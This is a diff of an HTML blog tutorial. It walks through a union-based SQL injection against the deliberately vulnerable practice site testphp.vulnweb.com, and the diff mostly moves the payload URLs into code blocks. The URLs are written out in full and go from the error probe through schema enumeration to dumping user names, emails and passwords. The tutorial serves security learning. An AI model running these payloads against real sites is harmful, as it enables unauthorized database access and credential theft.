@@ -193,7 +193,9 @@
 <blockquote>
 <p>If you don&rsquo;t know what SQL Injection Attack is, you can visit this link. <a href="https://www.w3schools.com/sql/sql_injection.asp">https://www.w3schools.com/sql/sql_injection.asp</a></p>
 </blockquote>
-<p>There&rsquo;s a website <strong><a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></strong> which is open for testing php vulnerablities. I will be using this website to perform SQLi attack.</p>
+<p>There&rsquo;s a website</p>
+<pre><code>http://testphp.vulnweb.com/listproducts.php?cat=1
+</code></pre><p>which is open for testing php vulnerablities. I will be using this website to perform SQLi attack.</p>
 <h3 id="1-discovering-if-the-website-is-vulnerable-to-sql-injection-attacks">1. Discovering if the website is vulnerable to SQL Injection attacks</h3>
 <p>The most basic and simple way is to check the URLs of pages you are visiting. If the URL is something of the form <strong><a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></strong>, it is a potential target. To check if the webpage is actually using a SQL backend, you can append <code>\</code> or a single inverted quote <code>'</code> at the end of URL and see if anything in the page breaks or you get an SQL error. For most cases the error is something like this:</p>
 <pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''a\'' at line 1
@@ -205,7 +207,10 @@
 <p>In the backend, the application might be running a query similar to</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT='&lt;the value of id&gt;'
 </code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
-<p>The query executed for <a href="http://testphp.vulnweb.com/listproducts.php?cat=1'">http://testphp.vulnweb.com/listproducts.php?cat=1'</a> would be</p>
+<p>The query executed for</p>
+<pre><code>http://testphp.vulnweb.com/listproducts.php?cat=1'
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>would be</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT=1'
 </code></pre><p>And you guessed it right. This will throw an error.</p>
 <p>The silver lining to this is now we know we can modify the query in any way we would like to. If I add <code>--+</code> to the end, the query should run without errors. ( <code>--+</code> or <code>#</code> will basically comment on anything written after it.This is a handy knowledge, though it may not be useful in this case)</p>
@@ -216,14 +221,16 @@
 </code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>This will sort the results on the basis of the 5th column.</p>
 <p>I will repeat this process for different values of column numbers until I get a column number for which the page breaks. for eg. in this case when <code>ORDER BY 12</code>, the page breaks. I now know that the total number of columns is 11. Since the number of columns is 11, I will run a query <code>select all 1,2,3,4,5,6,7,8,9,10,11</code>. </p>
-<p><strong><a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,2,3,4,5,6,7,8,9,10,11">http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,2,3,4,5,6,7,8,9,10,11</a></strong></p>
+<pre><code>http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,2,3,4,5,6,7,8,9,10,11
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>The corresponding MySQL query would look like</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,2,3,4,5,6,7,8,9,10,11
 </code></pre><p>Now navigate the webpage. In some places, you will find some of the numbers between 1 to 11. I see the numbers 7, 2 and 9.</p>
 <p><img src="../../images/blogs/SQLi/3.webp" alt="Image"></p>
 <p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>I now know that anything I write in the place of 7, 2 and 9 will be visible. I want to kow the <code>current database</code>, <code>user</code> and <code>version </code>, so I execute</p>
-<p><a href="https://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,user(),3,4,5,6,database(),8,version(),10,11">https://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,user(),3,4,5,6,database(),8,version(),10,11</a> .</p>
+<pre><code>https://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,user(),3,4,5,6,database(),8,version(),10,11
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <blockquote>
 <p>Note: %20 is ASCII for space</p>
 </blockquote>
@@ -240,7 +247,8 @@ I will get to know the datatbase, database version and the user details.</p>
 <h2 id="3-discovering-tables-and-table-data-in-the-currentdatabase">3. Discovering tables and table data in the current database</h2>
 <p>Once the above information is gathered, everything is going to be very simple.
 To get the list of tables, I will just run </p>
-<p><a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema%20=%27acuart%27">http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema%20=%27acuart%27</a></p>
+<pre><code>http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema%20=%27acuart%27
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>Corresponding SQL Query:</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema = 'acuart'
 </code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
@@ -261,7 +269,8 @@ The webpage would look like:</p>
 </ul>
 <h2 id="4-discovering-column-names-in-atable">4. Discovering column names in a table</h2>
 <p>Discovering columns of the table <code>users</code></p>
-<p><a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,column_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_name=%27users%27">http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,column_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_name=%27users%27</a></p>
+<pre><code>http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,column_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_name=%27users%27
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>Corresponding SQL Query:</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name = 'users'
 </code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
@@ -278,8 +287,9 @@ The webpage would look like:</p>
 <li>phone</li>
 </ul>
 <h2 id="5-discovering-data-stored-in-atable">5. Discovering data stored in a table</h2>
-<p>To view name, email, password of users  :
-<a href="http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,name,3,4,5,6,email,8,pass,10,11%20from%20users">http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,name,3,4,5,6,email,8,pass,10,11%20from%20users</a></p>
+<pre><code>To view name, email, password of users  :
+http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%20all%201,name,3,4,5,6,email,8,pass,10,11%20from%20users
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
 <p>Corresponding SQL Query:</p>
 <pre><code>SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,name,3,4,5,6,email,8,pass,10,11 from users
 </code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
